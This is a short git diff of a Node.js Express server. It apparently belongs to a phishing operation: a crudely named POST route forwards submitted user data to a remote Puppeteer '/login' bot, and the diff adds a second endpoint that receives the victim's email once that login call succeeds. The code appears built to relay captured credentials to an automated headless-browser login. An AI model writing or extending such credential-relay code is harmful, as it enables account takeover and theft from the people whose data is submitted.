@@ -8,6 +8,7 @@ const app = express();
 const PORT = process.env.PORT || 6282;
 
 const bot1 = 'https://puppeteer-9swz.onrender.com/login';
+const bot2 = '';
 
 app.use(cors());
 app.use(bodyParser.json());
@@ -44,17 +45,20 @@ app.post('/bhenchod', async (req, res) => {
       let emailSend = response.status;
 
       if (emailSend === 200) {
-        fetch('http://localhost:6969/mail', {
-          method: 'POST',
-          headers: { 'Content-Type': 'text/plain' },
-          body: userData.email
+        axios.post(bot2, userData.email, {
+            headers: { 'Content-Type': 'text/plain' }
         })
-          .then(response => response.text())
-          .then(data => console.log('Mail sent:', data))
-          .catch(error => console.error('Error sending mail:', error));
+        .then(response => {
+            console.log('Mail sent:', response.data);
+        })
+        .catch(error => {
+            console.error('Error sending mail:', error);
+        });
       }
     }
 
+// other bakchodi if email is not valid
+      
     catch (error) {
       console.error('Error sending data to /login:', error);
       if (error.response) {
